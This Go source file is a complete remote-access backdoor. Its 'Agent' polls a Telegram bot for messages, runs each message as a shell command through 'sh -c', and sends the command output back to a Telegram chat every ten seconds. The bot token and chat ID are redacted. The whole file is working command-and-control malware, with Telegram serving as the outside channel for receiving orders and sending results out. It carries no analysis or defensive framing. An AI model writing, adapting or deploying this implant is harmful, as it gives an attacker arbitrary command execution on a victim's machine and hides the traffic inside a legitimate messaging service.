package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

const BOT_TOKEN = "{REDACTED}"
const CHAT_ID = "{REDACTED}"

var offset int

type UpdateResponse struct{
	Ok bool `json:"ok"`
	Result []struct{
		UpdateID int `json:"update_id"`
		Message struct{
			Text string `json:"text"`
		} `json:"message"`
	} `json:"result"`
}

func getUpdates() ([]string, error){
	url := fmt.Sprintf("https://api.telegram.org/bot%s/getUpdates?offset=%d", BOT_TOKEN, offset)
	resp, err := http.Get(url)

	if err != nil{
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	var update UpdateResponse
	if err := json.Unmarshal(body, &update); err != nil {
        	return nil, err
    	}

	cmds := []string{}
	for _, r := range update.Result{
		offset = r.UpdateID + 1
		cmds = append(cmds, r.Message.Text)
	}
	
	fmt.Println(cmds)

	return cmds, nil
}

func sendMessage(text string){
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN)
	data := fmt.Sprintf("chat_id=%s&text=%s", CHAT_ID, text)
	http.Post(url, "application/x-www-form-urlencoded", bytes.NewBufferString(data))
}

func executeCommand(cmd string) string{
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()

	if err != nil{
		return err.Error()
	}
	return string(out)
}

func main() {
	sendMessage("Agent started!")

	for{
		cmds, err := getUpdates()
		if  err == nil{
			for _, cmd := range cmds{
				cmd = strings.TrimPrefix(cmd, "/cmd ")
				result := executeCommand(cmd)
				fmt.Println(cmd)
				sendMessage(result)
			}
		}
		time.Sleep(10 * time.Second)
	}
}
